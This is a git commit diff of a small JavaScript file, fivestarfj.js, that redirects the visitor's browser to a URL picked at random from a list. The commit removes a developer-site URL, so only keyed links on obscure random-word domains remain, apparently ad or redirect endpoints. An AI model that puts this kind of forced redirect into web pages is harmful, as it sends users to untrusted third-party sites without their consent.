6525f404cdb70c0dcf86283f44db845af1080f9e
inisialjurawa <84512688+inisialjurawa@users.noreply.github.com>
2022-02-22 21:38:08 -0600

    Update fivestarfj.js

--- fivestarfj.js
+++ fivestarfj.js
@@ -2,8 +2,7 @@ var dataUrl = [
 '//wavermerchandiseweird.com/qqqysyvbg?key=1d3303b4d7decb61514e9d25a740edfe',
 '//wavermerchandiseweird.com/tuf9tdkp?key=6729f99d594d33885cec1eb3981e92ac',
 '//anomalousporch.com/e5ntk4vw2?key=afc46c163b5e7aa15937edf1b69b82cc',
-'//anomalousporch.com/s12ygwr4j?key=0c236aab12a231150e5db3f8b366197c',
-'//dev-fivestarmovie.pantheonsite.io/'
+'//anomalousporch.com/s12ygwr4j?key=0c236aab12a231150e5db3f8b366197c'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
